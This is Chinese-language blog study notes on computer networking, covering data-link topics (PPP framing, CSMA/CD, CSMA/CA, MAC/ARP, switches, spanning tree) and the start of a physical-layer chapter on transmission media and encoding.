帧格式\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(9).png)\n\n- 标志(Flag) 字段：PPP帧的定界符，取值为0x7E\n- 地址(Address) 字段：取值为0xFF，预留(目前没有什么作用)\n- 控制(Control) 字段：取值为0x03，预留(目前没有什么作用)\n- 协议(Protocol) 字段：指明帧的数据部分送交哪个协议处理\n    - 取值0x0021表示：帧的数据部分为IP数据报\n    - 取值0xC021表示:帧的数据部分为LCP分组\n    - 取值0x8021表示:帧的数据部分为NCP分组\n- 帧检验序列(Frame Check Sequence)字段：CRC计算出的校验位\n\n## 透明传输\n\n实现透明传输的方法\n\n- 面向字节的异步链路：字节填充法（插入“转义字符”）\n  \n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(10).png)\n    \n    发送方的处理：\n    \n    - 出现的每一个7E (PPP帧的定界符)字节转变成2字节序列(7D,5E)\n    - 出现的每一个7D (转义字符)字节转变成2字节序列(7D,5D)\n    - 出现的每一个ASCII码控制字符(数值小于0x20的字符)，则在该字符前面插入一个7D字节，同时将该字符的编码加.上0x20。\n    \n    接收方的处理：\n    \n    - 进行反变换即可恢复出原来的帧的数据部分。\n- 面向比特的同步链路：比特填充法（插入“比特0”）\n  \n    发送方的处理：\n    \n    - 对帧的数据部分进行扫描(一般由硬件实现)。只要发现5个连续的比特1,则立即填充1个比特0。\n    \n    接收方的处理：\n    \n    - 对帧的数据部分进行扫描(一般由硬件实现)。只要发现5个连续的比特1,就把其后的1个比特0删除。\n\n## 差错控制\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(11).png)\n\n接收方每收到一个PPP帧，就进行CRC检验。若CRC检验正确，就收下这个帧；反之，就丢弃这个帧。\n\n使用PPP的数据链路层向上不提供可靠传输服务。\n\n# 媒体接入控制\n\n**媒体接入控制（介质访问控制）使用一对多的广播通信方式**\n\n> Medium Access Control翻译成媒体接入控制，有些翻译成介质访问控制\n\n---\n\n**局域网的数据链路层**\n\n- 局域网最主要的**特点**是：\n    - 网络为一个单位所拥有；\n    - 地理范围和站点数目均有限。\n- 局域网具有如下**主要优点**：\n    - 具有广播功能，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。\n    - 便于系统的扩展和逐渐地演变，各设备的位置可灵活调整和改变。\n    - 提高了系统的可靠性、可用性和残存性。\n\n---\n\n**数据链路层的两个子层**\n\n为了使数据链路层能更好地适应多种局域网标准，IEEE 802 委员会就将局域网的数据链路层拆成**两个子层**：\n\n1. **逻辑链路控制** LLC (Logical Link Control)子层；\n2. **媒体接入控制** MAC (Medium Access Control)子层。\n\n与接入到传输媒体有关的内容都放在 MAC子层，而 LLC 子层则与传输媒体无关。\n**不管采用何种协议的局域网，对 LLC 子层来说都是透明的。**\n\n---\n\n共享信道要着重考虑的一个问题就是如何协调多个发送和接收站点对一个共享传输媒体的占用，即媒体接入控制MAC(Medium Access Control)。\n\n> 随着技术的发展，交换技术的成熟和成本的降低，具有更高性能的使用**点对点链路**和链路层交换机的交换式局域网在**有线领域**已完全取代了共享式局域网，但由于无线信道的广播天性，**无线局域网**仍然使用的是**共享媒体技术。**\n\n## 静态划分信道\n\n**信道复用：**\n\n- 复用(Multiplexing) 是通信技术中的一个重要概念。复用就是通过一条物理线路同时传输多路用户的信号。\n- 当网络中传输媒体的传输容量大于多条单一信道传输的总通信量时， 可利用复用技术在一条物理线路上建立多条通信信道来充分利用传输媒体的带宽。\n\n---\n\n**频分复用FDM (Frequency Division Multiplexing)**\n\n- 将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。\n- **频分复用的所有用户同时占用不同的频带资源进行通信。**\n\n---\n\n**时分复用TDM (Time Division Multiplexing)**\n\n- **时分复用**则是将时间划分为一段段等长的**时分复用帧（TDM帧）**。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。\n- 每一个用户所占用的时隙是**周期性地出现**（其周期就是TDM帧的长度）的。\n- TDM 信号也称为**等时** (isochronous) 信号。\n- **时分复用的所有用户在不同的时间占用同样的频带宽度。**\n\n---\n\n**波分复用 WDM(Wavelength Division Multiplexing)**\n\n- 波分复用就是光的频分复用，使用一根光纤来同时传输多个光载波信号。\n- 光信号传输一段距离后会衰减，所以要用 掺铒光纤放大器 来放大光信号。\n\n---\n\n**码分复用 CDM (Code Division Multiplexing)**\n\n- **码分复用CDM**是另一种共享信道的方法。实际上，由于该技术主要用于多址接入，人们更常用的名词是**码分多址CDMA**(Code Division Multiple Access)。\n- 同理，频分复用FDM和时分复用TDM同样可用于多址接入,相应的名词是频分多址FDMA(Frequency Division Multiple Access)和时分多址TDMA(Time Division Multiple Access)。\n- 复用与多址的概念可简单理解为：\n    - 复用是将单一媒体的频带资源划分成很多子信道，这些子信道之间相互独立，互不干扰。从媒体的整体频带资源上看，每个子信道只占用该媒体频带资源的一部分。\n    - 多址(更确切地应该称为多点接入)处理的是**动态分配**信道给用户。这在用户仅仅暂时性地占用信道的应用中是必须的，而所有的移动通信系统基本上都属于这种情况。\n    - 相反，在信道永久性地分配给用户的应用中，多址是不需要的(对于无线广播或电视广播站就是这样)。\n    - 某种程度上，FDMA、TDMA、CDMA可以分别看成是FDM、TDM、CDM的应用。\n- 与FDM和TDM不同，CDM的每一个用户可以**在同样的时间使用同样的频带进行通信。**\n- 由于各用户使用经过特殊挑选的不同码型，因此各用户之间不会造成干扰。\nCDM最初是用于军事通信的，因为这种系统所发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。\n- 随着技术的进步，CDMA设备的价格和体积都大幅度下降，因而现在已广泛用于民用的移动通信中。\n\n---\n\n## 随机接入(CSMA/CD协议)\n\n以上所讨论的是静态划分信道，此外还有动态接入控制，其中包括 受控接入与随机接入，受控接入在局域网中使用较少，在此不作讨论。下面重点讨论随机接入。\n\n> **总线局域网使用协议：CSMA/CD**\n\n---\n\n### 工作原理\n\n载波监听 多址接入/碰撞检测 CSMA/CD (Carrier Sense Multiple Access/Collision Detection)\n\n- **多址接入MA**：多个主机连接在一条总线上，竞争使用总线。\n- **载波监听CS**：发送帧前线检测总线，若总线空闲96比特时间，则立即发送；若总线忙，则持续检测总线直到总线空闲96比特时间后再重新发送；\n- **碰撞检测CD**：边发送边检测碰撞，若检测到碰撞，则立即停止发送(以免继续浪费网络资源)，退避一段随机时间后再重新发送。\n  \n    以太网还采取一种叫做**强化碰撞**的措施。这就是当发送帧的站点一旦检测到碰撞，除了立即停止发送帧外，还要再继续发送**32比特或48比特的人为干扰信号(Jamming Signal)** ，以便有**足够多的碰撞信号使所有站点都能检测出碰撞。**\n\n> 一旦冲突，立即停说，等待时机，重新再说。\n\n---\n\n### 争用期\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(12).png)\n\n- 发送帧的主机最多经过以太网的**端到端往返传播时延2τ**(即δ→0 )的时长，就可检测到本次传输是否发生了碰撞。**2τ**称为**争用期**或碰撞窗口；\n- 只有经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞；\n- 显然，在以太网中发送帧的主机越多，端到端往返传播时延越大，发生碰撞概率就越大。因此，**共享式以太网不能连接太多的主机，使用的总线也不能太长。**\n    - 10Mb/s以太网把争用期**2τ** 定为512比特发送时间，即51.2μs, 因此其总线长度不能超过5120m，但考虑到其他一些因素，如信号衰减等，以太网规定总线长度不能超过2500m。\n\n---\n\n### 最小帧长\n\n- 最小帧长=争用期 * 数据发送速率\n- 以太网规定最小帧长为64字节，即512比特(512比特时间即为争用期)；\n    - 即保证发送时间不小于往返传输延时\n- 以太网的**最小帧长确保了主机可在帧发送完成之前就检测到该帧的发送过程中是否遭遇了碰撞**；\n    - 如果在争用期(共发送64字节)没有检测到碰撞，那么后续发送的数据就一定不会发生碰撞；\n    - 如果在争用期内检测到碰撞，就立即中止发送，这时已经发送出去的数据一定小于64字节，因此**凡长度小于64字节的帧都是由于碰撞而异常中止的无效帧**。\n\n---\n\n### 最大帧长\n\n为了防止主机长时间占用总线，以太网的帧也不能太长；以太网V2的MAC帧最大长度为1518字节(1500字节数据载荷，18字节首尾字段)；插入VLAN标记的802.1Q帧最大长度为1522字节(1500字节数据载荷，22字节首尾字段) ;\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(13).png)\n\n---\n\n### 截断二进制指数退避算法\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(14).png)\n\n- 若连续多次发生碰撞，就表明可能有较多的主机参与竞争信道。\n但使用上述退避算法可**使重传需要推迟的平均时间随重传次数而增大**(这也称为**动态退避**)，因而减小发生碰撞的概率，有利于整个系统的稳定。\n- **当重传达16次仍不能成功时**，表明同时打算发送帧的主机太多，以至于连续发生碰撞，则**丢弃该帧**并向高层报告。\n\n---\n\n### 信道利用率\n\n一个帧成功发送可能会经历多次碰撞和退避，下面考虑极限信道利用率，也就是理想情况下的信道利用率：\n\n- 帧本身的发送时间是T0，端到端的传输时间为t，则发送一帧占用总线的时间为T0+t\n- 极限信道利用率Smax=T0/( T0+t )\n    - 因此要提高信道利用率，需要增大T0，也就是以太网帧长度应尽量长些；减小t，也就是以太网端到端的举例因受限制。\n\n---\n\n### 协议特点\n\n- 使用 CSMA/CD 协议的以太网不能进行全双工通信而**只能进行双向交替通信（半双工通信）**\n- 每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性。\n- 这种**发送的不确定性**使整个以太网的平均通信量远小于以太网的最高数据率。\n\n> CSMA/CD协议曾经用于各种总线结构以太网和双绞线以太网的早期版本中。\n> \n> \n> **现在的以太网基于交换机和全双工连接，不会有碰撞，因此没有必要使用CSMA/CD协议**\n\n---\n\n## 随机接入(CSMA/CA协议)\n\n> **无线局域网使用的协议：CSMA/CA**\n\n载波监听 多址接入/碰撞避免 CSMA/CA (Carrier Sense Multiple Access/Collision Avoidance)\n\n- 802.11无线局域网在MAC层使用CSMA/CA协议，以尽量减小碰撞发送的概率。\n- 802.11无线局域网使用CSMA/CA协议，在CSMA的基础上增加了一个碰撞避免CA功能，而不再实现碰撞检测功能。\n- 不能使用CSMA/CD协议的原因是在无线局域网中无法实现碰撞检测。在使用CSMA/CA协议的同时，还使用停止-等待协议来实现可靠传输。\n    - 在无线局域网中，不能使用碰撞检测CD，原因如下：\n        - 由于无线信道的传输条件特殊，其信号强度的动态范围非常大，无线网卡上接收到的信号强度往往会远远小于发送信号的强度(可能相差百万倍)。如果要在无线网卡上实现碰撞检测CD，对硬件的要求非常高。\n        - 即使能够在硬件上实现无线局域网的碰撞检测功能，但由于无线电波传播的特殊性(存在隐蔽站问题)，进行碰撞检测的意义也不大。\n- 802.11的MAC层标准定义了两种不同的媒体接入控制方式：\n    - 分布式协调功能DCF(Distributed Coordination Function)。在DCF方式下，没有中心控制站点，每个站点使用CSMA/CA协议通过争用信道来获取发送权，这是802.11定义的默认方式。\n    - 点协调功能PCF(Point Coordination Function)。PCF方式使用集中控制的接入算法(一般在接入点AP实现集中控制)，是802.11定义的可选方式，在实际中较少使用。\n\n---\n\n### 帧间间隔IFS(InterFrame Space)\n\n802.11标准规定，所有的**站点必须在持续检测到信道空闲一段指定时间后才能发送帧**，这段时间称为帧间间隔IFS。\n\n帧间间隔的长短取决于该站点要发送的帧的类型：\n\n- 高优先级帧需要等待的时间较短，因此可优先获得发送权；\n- 低优先级帧需要等待的时间较长。若某个站的低优先级帧还没来得及发送，而其他站的高优先级帧已发送到信道上，则信道变为忙态，因而低优先级帧就只能再推迟发送了。这样就减少了发生碰撞的机会。\n- 常用的两种帧间间隔如下：\n    - **短帧间间隔SIFS**(28μs)，是最短的帧间间隔，用来分隔开属于一次对话的各帧。一个站点应当能够在这段时间内从发送方式切换到接收方式。使用SIFS的帧类型有ACK帧、CTS帧、 由过长的MAC帧分片后的数据帧、以及所有回答AP探询的帧和在PCF方式中接入点AP发送出的任何帧。\n    - **DCF帧间间隔DIFS**(128μs)，它比短帧间间隔SIFS要长得多，在DCF方式中用来发送数据帧和管理帧。\n\n---\n\n### 工作原理\n\n**源站在检测到信道空闲后还要再等待一段时间DIFS后，再决定发送数据。**\n\n- 这是因为考虑到可能有其他的站有高优先级的帧要发送。若有，就要让高优先级帧先发送。\n\n**目的站正确接收数据帧后还要等待一段时间SIFS才能发送ACK帧。**\n\n- 这是因为SIFS是最短的帧间间隔，用来**分隔开**属于一次对话的**各帧**，在这段时间内，一个站点应当能够从发送方式切换到接收方式。\n\n**信道由忙转为空闲且经过DIFS时间后，还要退避一段随机时间才能使用信道**\n\n- 这是为了防止多个站点同时发送数据而产生碰撞\n\n**使用退避算法的时机：**\n\n- 在发送数据帧之前检测到信道处于忙状态时；\n- 在每一次重传一个数据帧时；\n- 在每一次成功发送后要连续发送下一个帧时(这是为了避免一个站点长时间占用信道)。\n\n---\n\n### 扩展：退避算法\n\n在执行退避算法时，站点为退避计时器设置一个随机的退避时间：\n\n- 当退避计时器的时间减小到零时，就开始发送数据；\n- 当退避计时器的时间还未减小到零时而信道又转变为忙状态，这时就冻结退避计时器的数值，重新等待信道变为空闲，再经过时间DIFS后，继续启动退避计时器。\n\n在进行第i次退避时，退避时间在时隙编号{0, 1, ... , 2^(2+i)-1}中随机选择一个, 然后乘以基本退避时间(也就是一个时隙的长度)就可以得到随机的退避时间。这样做是为了使不同站点选择相同退避时间的概率减少。当时隙编号达到255时(对应于第6次退避)就不再增加了。\n\n---\n\n- 为了尽可能地避免各种可能的碰撞，CSMA/CA协议采用了一种不同于CSMA/CD协议的退避算法。当要发送帧的站点检测到信道从忙态转为空闲时，都要执行退避算法。\n- 802.11标准规定，所有的站在完成发送后，必须再等待一段帧间间隔时间才能发送下一帧。帧间间隔的长短取决于该站要发送的帧的优先级。\n- 在802.11无线局域网的MAC帧首部中有一个持续期字段，用来填入在本帧结束后还要占用信道多久时间，其他站点通过该字段可实现虚拟载波监听。\n- 802.11标准允许要发送数据的站点对信道进行预约，即在发送数据帧之前先发送请求发送RTS帧。在收到响应允许发送CTS帧后,就可发送数据帧。\n\n# MAC地址、IP地址以及ARP协议\n\n数据链路层：\n\n- MAC地址是以太网的MAC子层所使用的地址；\n\n网际层：\n\n- IP地址是TCP/IP体系结构网际层所使用的地址；\n- ARP协议属于TCP/IP体系结构的网际层，其作用是已知设备所分配到的IP地址，使用ARP协议可以通过该IP地址获取到设备的MAC地址；\n\n> 尽管IP地址和ARP协议属于TCP/IP体系结构的网际层(而不属于数据链路层)，但是它们与MAC地址存在一定的关系,并且我们日常的网络应用都离不开MAC地址、IP地址以及ARP协议。因此，我们将这三者放在一起讨论。\n\n## MAC地址\n\n- 当多个主机连接在同一个广播信道上，要想实现两个主机之间的通信，则每个主机都必须有一个唯一的标识, 即一个数据链路层地址；\n- 在每个主机发送的**帧中必须携带标识发送主机和接收主机的地址**。由于这类地址是用于媒体接入控制MAC(Media Access Control)，因此这类地址被称为MAC地址；\n    - MAC地址一般被固化在网卡(网络适配器)的电可擦可编程只读存储器EEPROM中，因此MAC地址也被称为硬件地址；\n- 一般情况下，用户主机会包含两个网络适配器：有线局域网适配器(有线网卡)和无线局域网适配器(无线网卡)。每个网络适配器都有一个全球唯一的MAC地址。而交换机和路由器往往拥有更多的网络接口，所以会拥有更多的MAC地址。\n- 综上所述，严格来说，MAC地址是对网络上各接口的唯一标识， 而不是对网络上各设备的唯一标识。\n\n### IEEE 802局域网的MAC地址格式\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(15).png)\n\n> 对于使用EUI-48空间的应用程序，IEEE的目标寿命为100年（直到2080年），但是鼓励采用EUI-64作为替代\n\n注：在MAC地址发送顺序中，字节发送顺序为从第一字节到第六字节，而字节内的比特发送数据则是从b0到b7.\n\n## IP地址\n\n- IP地址是因特网(Internet) 上的主机和路由器所使用的地址，用于标识两部分信息：\n    - 网络编号：标识因特网上数以百万计的网络\n    - 主机编号：标识同一网络上不同主机(或路由器)\n- 很显然，之前介绍的MAC地址不具备区分不同网络的功能。\n    - 如果只是一个单独的网络，不接入因特网，可以只使用MAC地址(这不是一般用户的应用方式)。\n    - 如果主机所在的网络要接入因特网，则IP地址和MAC地址都需要使用。\n- 数据包转发过程中IP地址与MAC地址的变化情况：\n    - 源IP地址和目的IP地址保持不变；\n    - 源MAC地址和目的MAC地址逐个链路(或逐个网络)改变。\n\n### ARP协议\n\nARP协议：地址解析协议\n\n- 源主机在自己的**ARP高速缓存表**中查找目的主机的IP地址所对应的MAC地址，若找到了，则可以封装MAC帧进行发送；若找不到，则发送**ARP请求(封装在广播MAC帧中)** ；\n- 目的主机收到ARP请求后，将源主机的IP地址与MAC地址记录到自己的ARP高速缓存表中，然后给源主机发送**ARP响应(封装在单播MAC帧中)**。ARP响应中包含有目的主机的IP地址和MAC地址；\n- 源主机收到ARP响应后，将目的主机的IP地址与MAC地址记录到自己的ARP高速缓存表中，然后就可以封装之前想发送的MAC帧并发送给目的主机；\n- ARP协议只能在一段链路或一个网络上使用，而不能跨网络使用；\n- 除ARP请求和响应外，ARP还有其他类型的报文(例如用于检查IP地址冲突的“无故ARP、免费ARP(Gratuitous ARP)”)；\n- ARP没有安全验证机制，存在ARP欺骗(攻击)问题。\n\n> 高速缓存表中的表项有动态和静态两种，动态的生命周期默认为两分钟，因此IP地址与MAC地址的对应关系记录是**会定期自动删除的。**\n\n# 集线器与交换机\n\n- **广播域（broadcast domain）**：指这样一部分网络，其中任何一台设备发出的广播通信都能被该部分网络中的所有其他设备所接收。\n- **碰撞域（collision domain）**：又称为**冲突域**，是指网络中一个站点发出的帧会与其他站点发出的帧产生碰撞或冲突的那部分网络。\n- 碰撞域越大，发生碰撞的概率越高。\n\n## 集线器-在物理层扩展以太网\n\n- 早期以太网的互连设备\n- 工作在OSI体系结构的物理层\n- 对接收到的信号进行放大、转发\n    - **集线器**是也可以看做多口中继器，每个端口都可以成为一个中继器，中继器是对减弱的信号进行放大和发送的设备。\n- 使用集线器作为互连设备的以太网仍然属于共享总线式以太网。集线器互连起来的所有主机共享总线带宽，属于同一个碰撞域和广播域。\n- **扩大了广播域，同时也扩大的冲突域**\n\n## 交换机-在数据链路层扩展以太网\n\n- 扩展以太网更常用的方法是在数据链路层进行。\n- 早期使用**网桥**，现在使用**以太网交换机**。\n\n**网桥**\n\n- 工作在数据链路层。\n- 它根据 MAC 帧的目的地址对收到的帧进行转发和过滤。\n- 当网桥收到一个帧时，并不是向所有的接口转发此帧，而是先检查此帧的目的MAC 地址，然后再确定将该帧转发到哪一个接口，或把它丢弃。\n\n**交换机**\n\n- 1990 年问世的交换式集线器 (switching hub) 可明显地提高以太网的性能。\n- 交换式集线器常称为**以太网交换机** (switch) 或**第二层交换机** (L2 switch)，强调这种交换机工作在数据链路层。\n- 以太网交换机实质上就是一个**多接口的网桥**\n\n---\n\n- 交换机是目前以太网中使用最广泛的互连设备\n- 工作在OSI体系结构的数据链路层(也包括物理层)\n- 根据MAC地址对帧进行转发\n- 使用交换机作为互连设备的以太网，称为交换式以太网。交换机可以根据MAC地址过滤帧，即隔离碰撞域。\n- 交换机的每个接口是一个独立的碰撞域\n- **交换机扩大了广播域，但隔离了冲突域**(VLAN除外)\n\n---\n\n分析区别：\n\n多台主机同时给另一台主机发送单播帧\n\n- 集线器以太网：会产生碰撞，遭遇碰撞的帧会传播到总线上的各主机\n- 交换机以太网：会将它们缓存起来，然后逐个转发给目的主机，不会产生碰撞\n\n> 工作在数据链路层的以太网交换机，其性能远远超过工作在物理层的集线器，而且价格并不贵，这就使得集线器逐渐被市场淘汰\n\n# 以太网交换机自学习和转发帧\n\n- 以太网交换机工作在**数据链路层**(也包括物理层)\n- 以太网交换机收到帧后，在帧交换表中查找**帧的目的MAC地址所对应的接口号**，然后通过该接口转发帧。\n- 以太网交换机是一种即插即用设备，刚上电启动时其内部的帧交换表是空的。随着网络中各主机间的通信，以太网交换机通过**自学习算法**自动逐渐**建立起帧交换表**。\n- 以太网交换机自学习和转发帧的流程:\n    - 收到帧后进行登记。 登记的内容为帧的源MAC地址及进入交换机的接口号；\n    - 根据帧的目的MAC地址和交换机的帧交换表对帧进行转发, 有以下三种情况：\n        - 明确转发: 交换机知道应当从哪个(或哪些)接口转发该帧(单播，多播，广播)\n        - 盲目转发:交换机不知道应当从哪个端口转发帧，只能将其通过除进入交换机的接口外的其他所有接口转发(也称为泛洪)。\n        - 明确丢弃: 交换机知道不应该转发该帧，将其丢弃。\n- 帧交换表中的每条记录都有自己的有效时间，到期删除。原因如下:\n    - 交换机的接口改接了另一台主机;\n    - 主机更换了网卡。\n\n# 生成树协议STP\n\n> IEEE 802.1D 标准制定了一个**生成树协议 STP** (Spanning Tree Protocol)\n\n为提高以太网的可靠性，可添加冗余链路来提高以太网的可靠性。\n\n但是，冗余链路也会带来负面效应形成网络环路，网络环路会带来以下问题：\n\n- 广播风暴\n  \n    大量消耗网络资源，使得网络无法正常转发其他数据帧;\n    \n- 主机收到重复的广播帧\n  \n    大量消耗主机资源\n    \n- 交换机的帧交换表震荡(漂移)\n\n以太网交换机使用**生成树协议STP**(Spanning Tree Protocol)，可以在增加冗余链路来提高网络可靠性的同时又**避免网络环路带来的各种问题**。\n\n- 不论交换机之间采用怎样的物理连接，交换机都能够**自动计算并构建一个逻辑没有环路的网络**，其逻辑拓扑结构是无环路的树状结构；\n- 最终生成的树型逻辑拓扑要确保连通整个网络；\n- 当首次连接交换机或网络物理拓扑发生变化时(有可能是人为改变或故障)，交换机都将进行生成树的重新计算。\n\n---\n\n> 为了分割广播域，虚拟局域网VLAN技术应运而生，在此不展开。","tags":["计算机网络"],"categories":["计算机网络"]},{"title":"计算机网络-第二章-物理层","url":"/2021/10/30/计算机网络-第二章-物理层/","content":"\n# 物理层的基本概念\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(1).png\" width=\"80%\" />\n\n物理层考虑的是怎样才能在连接各种计算机的传输媒体上**传输数据比特流**。\n\n<!-- more -->\n物理层为数据链路层屏蔽了各种传输媒体的差异，使数据链路层只需要考虑如何完成本层的协议和服务，而不必考虑网络具体的传输媒体是什么。\n\n物理层协议的主要任务：\n\n- **机械特性**：指明接口所用接线器的形状和尺寸，引脚数目和排列、固定和锁定装置；\n- **电气特性**：指明在接口电缆的各条线上出现的电压的范围；\n- **功能特性**：指明某条线.上出现的某一电平的电压表示何种意义；\n- **过程特性**：指明对于不同功能的各种可能事件的出现顺序。\n\n# 物理层下面的传输媒体\n\n**传输媒体**也称为传输介质或传输媒介，就是数据传输系统中在发送器和接收器之间的物理通路。\n\n**传输媒体**可分为两大类，即**导引型传输媒体**和**非导引型传输媒体。**\n\n> 传输媒体不属于计算机网络体系结构的任何一层，如果非要将它添加到体系结构中，那只能将其放置到物理层之下。\n\n## **导引型传输媒体**\n\n在导引型传输媒体中，电磁波被导引沿着固体媒体传播。\n\n---\n\n**同轴电缆：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(2).png\" width=\"67%\" />\n\n- 基带同轴电缆(50Ω)：数字传输，过去用于局域网\n- 宽带同轴电缆(75Ω)：模拟传输，目前主要用于有线电视\n\n同轴电缆价格较贵且布线不够灵活和方便，随着集线器的出现，在局域网领域基本上都是采用双绞线作为传输媒体。\n\n---\n\n**双绞线：**\n\n用两根线绞合的作用在于：\n\n- 抵御部分来自外界的电磁波干扰\n- 减少相邻导线的电磁干扰\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(3).png\" width=\"80%\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(4).png\" width=\"80%\" />\n\n---\n\n**光纤：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(5).png\" width=\"67%\" />\n\n光纤的优点：\n\n- 通信容量大 (25000~ 30000GHz的带宽)；\n- 传输损耗小，远距离传输时更加经济；\n- 抗雷电和电磁干扰性能好。这在大电流脉冲干扰的环境下尤为重要；\n- 无串音干扰，保密性好，不易被窃听；\n- 体积小， 重量轻。\n\n光纤的缺点：\n\n- 割接需要专用设备。\n\n> 光纤的工作原理：光纤外层为低折射率的包层，内层为高折射率的纤芯，光线在纤芯中传输的方式就是不断地全反射。\n\n**多模光纤**\n\n- 可以存在多条不同角度入射的光线在一条光纤中传输。这种光纤就称为**多模光纤**。\n\n**单模光纤**\n\n- 若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，它可使光线一直向前传播，而不会产生多次反射。这样的光纤称为**单模光纤**。\n\n## **非导引型传输媒体**\n\n非导引型传输媒体是指自由空间。\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(6).png\" width=\"80%\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(7).png\" width=\"80%\" />\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(8).png\" width=\"80%\" />\n\n**无线电波：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(9).png\" width=\"80%\" />\n\n**微波：**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(10).png\" width=\"80%\" />\n\n**红外线：**\n\n在早期，计算机之间使用过红外线通信，其特点是可以实现点对点无线传输，但只能直线传输，中间不能有障碍物，传输距离短，传输速率比较低(4Mb/s~16Mb/s)。\n\n如今已经被淘汰，但在许多手机中仍能见到这个功能，一般可以用红外通信遥控电器等。\n\n---\n\n扩展：这些频段的划分都由专门的**无线电频谱管理机构**来完成。\n\n- 中国:工业和信息化部无线电管理局(国家无线电办公室)\n- 美国:联邦通讯委员会FCC\n  ISM (Industrial, Scientific, Medical)频段\n  \n    <img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(11).png\" width=\"80%\" />\n\n# 传输方式\n\n## 串行传输与并行传输\n\n**串行传输**：\n\n- 数据是一个比特一个比特依次发送的，因此在发送端与接收端之间，只需要一条数据传输线路即可。\n\n**并行传输**：\n\n- 一次发送n个比特，因此，在发送端和接收端之间需要有n条传输线路；\n- 并行传输的优点是比串行传输的速度n倍，但成本高。\n\n> 数据在传输线路上的传输采用是**串行传输**，计算机内部的数据传输常用**并行传输。**\n\n## 同步传输与异步传输\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(12).png\" width=\"80%\" />\n\n**同步传输**：\n\n- 数据块以稳定的比特流的形式传输，**字节之间没有间隔**；\n- 接收端在每个比特信号的**中间时刻进行检测**，以判别接收到的是比特0还是比特1\n- 由于不同设备的时钟频率存在一定差异，不可能做到完全相同，在传输大量数据的过程中，所产生的判别时刻的累计误差，会导致接收端对比特信号的判别错位，所以要**使**收发双发**时钟保持同步。**\n\n收发双方时钟同步的方法：\n\n- 外同步：在收发双方之间添加一条单独的时钟信号线\n- 内同步：发送端将时钟同步信号编码到发送数据中一起传输(如曼彻斯特编码)\n\n---\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(13).png\" width=\"80%\" />\n\n**异步传输**：\n\n- 以字节为独立的传输单位，字节之间的时间间隔不固定 (**字节之间异步**)；\n- 接收端仅在每个字节的起始处对**字节内的比特实现同步**，各比特的持续时间相同；\n- 通常在每个字节前后分别加上起始位和结束位。\n\n## 单工、半双工与全双工\n\n在许多情况下，我们要使用“**信道（channel）**”这一名词。信道和电路并不等同。信道一般都是用来表示向某一个方向传送信息的媒体。因此，一条通信电路往往包含一条发送信道和一条接收信道。\n\n从通信的双方信息交互的方式来看，可以有以下三种基本方式：\n\n**单向通信**：\n\n又称为**单工通信**，即只能有一个方向的通信而没有反方向的交互。\n例子：无线电广播、有线电广播、电视广播。\n\n**双向交替通信**：\n\n又称为**半双工通信**，即通信的双方可以发送信息，但不能双方同时发送（当然也就不能同时接收）。\n例子：对讲机。\n\n**双向同时通信**：\n\n又称为**全双工通信**，即通信的双发可以同时发送和接收信息。\n例子：手机等。\n\n注：严格来说，传输媒体并不能和信道划等号，单向通信只需要一条信道，而双向交替通信或双向同时通信则需要两条信道（每个方向各一条），其中**双向同时通信**的传输效率最高（如果使用信道复用技术，一条传输媒体还可以包含多个信道）\n\n# 编码与调制\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211030(14).png\"  />\n\n## 常用术语\n\n- **数据 (data)** —— 运送消息的实体；\n- **信号 (signal)** —— 数据的电气的或电磁的表现；\n- **模拟信号 (analogous signal)** —— 代表消息的参数的取值是连续的；\n- **数字信号 (digital signal)** —— 代表消息的参数的取值是离散的；\n- **码元 (code)** —— 在使用时间域（或简称为时域）的波形表示数字信号时，代表不同离散数值的基本波形；\n- **基带信号**（即基本频带信号）—— 来自信源的信号；\n  像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。\n    - 基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。因此必须对基带信号进行**调制**(modulation)\n\n在计算机网络中，常见的是将**数字基带信号**通过编码或调制的方法在相应信道进行传输。\n\n## 常用编码\n\n**不归零编码：**\n\n- 正电平表示比特1或0 | 负电平表示比特0或1\n- 所谓不归零编码，就是指在整个码元时间内，电平不会出现零电平。\n\n**实际比特1和比特0的表示要看现实怎么规定；**\n\n那么问题来了，多个1或多个0传输时，如何判断其比特数量？\n\n这就需要发送方的发送和接收方的接收做到严格的同步。\n\n- 